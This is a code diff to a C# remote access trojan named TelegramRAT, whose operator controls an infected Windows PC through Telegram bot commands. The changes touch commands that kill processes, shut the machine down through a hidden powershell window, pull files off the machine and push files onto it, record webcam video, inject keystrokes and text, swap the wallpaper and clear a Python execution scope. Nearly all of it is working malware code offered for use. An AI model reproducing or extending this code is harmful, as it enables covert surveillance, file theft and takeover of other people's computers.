@@ -274,6 +274,7 @@ namespace TelegramRAT
             {
                 Command = "/processkill",
                 IgnoreCountArgs = true,
+                MayHaveNoArgs = false,
                 Description = "Kill process or processes by name.",
                 Example = "/processkill",
                 Execute = async (model, update) =>
@@ -343,19 +344,24 @@ namespace TelegramRAT
             //SHUTDOWN
             commands.Add(new BotCommand
             {
-                Command = "/shutdown",
-                CountArgs = 0,
+                Command = "/power",
+                CountArgs = 1,
                 Description = "Turn PC off.",
-                Example = "/shutdown",
-                Execute = async (model, update) =>
+                Example = "/power off",
+                Execute = (model, update) =>
                 {
                     try
                     {
+                        if (model.Args[0] != "off")
+                        {
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "To shutdown pc send /power off!", replyToMessageId: update.Message.MessageId);
+                            return;
+                        }
                         Process shutdown = new Process();
                         shutdown.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         shutdown.StartInfo.FileName = "powershell.exe";
                         shutdown.StartInfo.Arguments = "/C shutdown /s /t 1";
-                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                         shutdown.Start();
                     }
                     catch (Exception ex)
@@ -398,13 +404,12 @@ namespace TelegramRAT
             {
                 Command = "/download",
                 IgnoreCountArgs = true,
+                MayHaveNoArgs = false,
                 Example = "/download hello.txt",
                 Execute = async (model, update) =>
                 {
                     try
                     {
-                        if (model.RawArgs == null)
-                            return;
                         var filetodownload = model.RawArgs;
                         if (!System.IO.File.Exists(Directory.GetCurrentDirectory() + "\\" + filetodownload))
                         {
@@ -574,7 +579,7 @@ namespace TelegramRAT
                 Command = "/upload",
                 IgnoreCountArgs = true,
                 MayHaveNoArgs = true,
-
+                Description = "Upload image or file to current directory.",
                 Execute = async (model, update) =>
                 {
                     try
@@ -583,37 +588,51 @@ namespace TelegramRAT
                         {
                             foreach (PhotoSize photo in update.Message.Photo)
                             {
-                                System.IO.File.Create(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png").Close();
+                                var photoFileStream = System.IO.File.Create(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png");
 
                                 Telegram.Bot.Types.File photoFile = await Bot.GetFileAsync(photo.FileId);
+                                Bot.DownloadFileAsync(photoFile.FilePath, photoFileStream).Wait();
+                                photoFileStream.Close();
 
-                                using (FileStream fs = new FileStream(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png", FileMode.Open, FileAccess.Write))
-                                {
-                                    Bot.DownloadFileAsync(photoFile.FilePath, fs).Wait();
-                                }
                             }
                         }
                         else if (update.Message.Type == MessageType.Document)
                         {
-                            Telegram.Bot.Types.File doc = await Bot.GetFileAsync(update.Message.Document.FileId);
-
-                            using (var fs = new FileStream(Directory.GetCurrentDirectory() +
-                                $"\\{update.Message.Document.FileName}", FileMode.Create))
+                            Telegram.Bot.Types.File documentFile = await Bot.GetFileAsync(update.Message.Document.FileId);
+                            var documentFileStream = System.IO.File.Create(update.Message.Document.FileName);
+                            Bot.DownloadFileAsync(documentFile.FilePath, documentFileStream).Wait();
+                            documentFileStream.Close();
+                        }
+                        else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Photo)
+                        {
+                            foreach (PhotoSize photo in update.Message.ReplyToMessage.Photo)
                             {
-                                Bot.DownloadFileAsync(doc.FilePath, fs).Wait();
+                                var photoFileStream = System.IO.File.Create(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png");
+
+                                Telegram.Bot.Types.File photoFile = await Bot.GetFileAsync(photo.FileId);
+                                Bot.DownloadFileAsync(photoFile.FilePath, photoFileStream).Wait();
+                                photoFileStream.Close();
 
                             }
                         }
+                        else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Document)
+                        {
+                            Telegram.Bot.Types.File documentFile = await Bot.GetFileAsync(update.Message.ReplyToMessage.Document.FileId);
+                            var documentFileStream = System.IO.File.Create(update.Message.ReplyToMessage.Document.FileName);
+                            Bot.DownloadFileAsync(documentFile.FilePath, documentFileStream).Wait();
+                            documentFileStream.Close();
+                        }
                         else
+                        {
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "No file or photo pinned, use /help upload to get info about this command!", replyToMessageId: update.Message.MessageId);
                             return;
+                        }
                     }
                     catch (Exception ex)
                     {
                         ReportError(update, ex);
                     }
-                },
-                Description = "Upload image or file to current directory."
-
+                }
             });
 
             //RECORD VIDEO FROM WEBCAM
@@ -621,6 +640,7 @@ namespace TelegramRAT
             {
                 Command = "/video",
                 CountArgs = 1,
+                Description = "Record video from webcamera for given amount of seconds.",
                 Execute = async (model, update) =>
                 {
                     await Task.Run(async () =>
@@ -664,8 +684,7 @@ namespace TelegramRAT
                             ReportError(update, ex);
                         }
                     });
-                },
-                Description = "Record video from webcamera for given amount of seconds."
+                }
             });
 
             //SEND KEYBOARD INPUT 
@@ -673,6 +692,20 @@ namespace TelegramRAT
             {
                 Command = "/sendinput",
                 IgnoreCountArgs = true,
+                MayHaveNoArgs = false,
+                Description =
+                #region desc
+                "Simulate keyboard input with virtual keycode, expressed in hexadecimal\n\n" +
+                "List of virtual keycodes:\n" +
+                "LBUTTON = 1\nRBUTTON = 2\nCANCEL = 3\nMIDBUTTON = 4\nBACKSPACE = 8\n" +
+                "TAB = 9\nCLEAR = C\nENTER = D\nSHIFT = 10\nCTRL = 11\nALT = 12\n" +
+                "PAUSE = 13\nCAPSLOCK = 14\nESC = 1B\nSPACE = 20\nPAGEUP = 21\nPAGEDOWN = 22\n" +
+                "END = 23\nHOME = 24\nLEFT = 25\nUP = 26\nRIGHT = 27\nDOWN = 28\n\n0..9 = 30..39\n" +
+                "A..Z = 41..5a\nF1..F24 = 70..87\n\n" +
+
+                "<a href=\"https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\">See all keycodes</a>\n\n" +
+                "To send combination of keys, join them with plus: 11+43 (ctrl+c)\n",
+                #endregion
                 Example = "/sendinput 48 45 4c 4c 4f (hello)",
                 Execute = async (model, update) =>
                 {
@@ -706,19 +739,7 @@ namespace TelegramRAT
                     });
                 },
 
-                Description =
-                #region desc
-                "Simulate keyboard input with virtual keycode, expressed in hexadecimal\n\n" +
-                "List of virtual keycodes:\n" +
-                "LBUTTON = 1\nRBUTTON = 2\nCANCEL = 3\nMIDBUTTON = 4\nBACKSPACE = 8\n" +
-                "TAB = 9\nCLEAR = C\nENTER = D\nSHIFT = 10\nCTRL = 11\nALT = 12\n" +
-                "PAUSE = 13\nCAPSLOCK = 14\nESC = 1B\nSPACE = 20\nPAGEUP = 21\nPAGEDOWN = 22\n" +
-                "END = 23\nHOME = 24\nLEFT = 25\nUP = 26\nRIGHT = 27\nDOWN = 28\n\n0..9 = 30..39\n" +
-                "A..Z = 41..5a\nF1..F24 = 70..87\n\n" +
-
-                "<a href=\"https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\">See all keycodes</a>\n\n" +
-                "To send combination of keys, join them with plus: 11+43 (ctrl+c)\n"
-                #endregion
+               
             });
 
             //CHANGE WALLPAPER
@@ -737,12 +758,42 @@ namespace TelegramRAT
 
                                 using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                 {
-                                    Telegram.Bot.Types.File photo = await Bot.GetFileAsync(update.Message.Photo.Last().FileId);
-                                    await Bot.DownloadFileAsync(photo.FilePath, fs);
+                                    Telegram.Bot.Types.File wallpaperPhoto = await Bot.GetFileAsync(update.Message.Photo.Last().FileId);
+                                    await Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs);
                                 }
-                                WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, "wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
-                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                             }
+                            else if (update.Message.Type == MessageType.Document)
+                            {
+                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                                {
+                                    Telegram.Bot.Types.File wallpaperFile = await Bot.GetFileAsync(update.Message.Document.FileId);
+                                    await Bot.DownloadFileAsync(wallpaperFile.FilePath, fs);
+                                }
+                            }
+                            else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Photo)
+                            {
+                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                                {
+                                    Telegram.Bot.Types.File wallpaperPhoto = await Bot.GetFileAsync(update.Message.ReplyToMessage.Photo.Last().FileId);
+                                    await Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs);
+                                }
+                            }
+                            else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Document)
+                            {
+                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                                {
+                                    Telegram.Bot.Types.File wallpaperFile = await Bot.GetFileAsync(update.Message.ReplyToMessage.Document.FileId);
+                                    await Bot.DownloadFileAsync(wallpaperFile.FilePath, fs);
+                                }
+                            }
+                            else
+                            {
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "No file or photo pinned, use /help wallpaper to get info about this command!", replyToMessageId: update.Message.MessageId);
+                                return;
+                            }
+
+                            WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, "wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
+                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                         }
                         catch (Exception ex)
                         {
@@ -1040,6 +1091,7 @@ namespace TelegramRAT
             {
                 Command = "/sendtext",
                 IgnoreCountArgs = true,
+                MayHaveNoArgs = false,
                 Description = "Send text input",
                 Example = "/sendtext hello world",
                 Execute = (model, update) =>
@@ -1525,6 +1577,7 @@ namespace TelegramRAT
             commands.Add(new BotCommand
             {
                 Command = "/pyclearscope",
+                CountArgs = 0,
                 Description = "Clear python execution scope.",
                 Execute = (model, update) =>
                 {
@@ -1682,7 +1735,7 @@ namespace TelegramRAT
         }
 
 
-        public static string GetWindowsVersion()
+        static string GetWindowsVersion()
         {
             RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
             if (key != null)
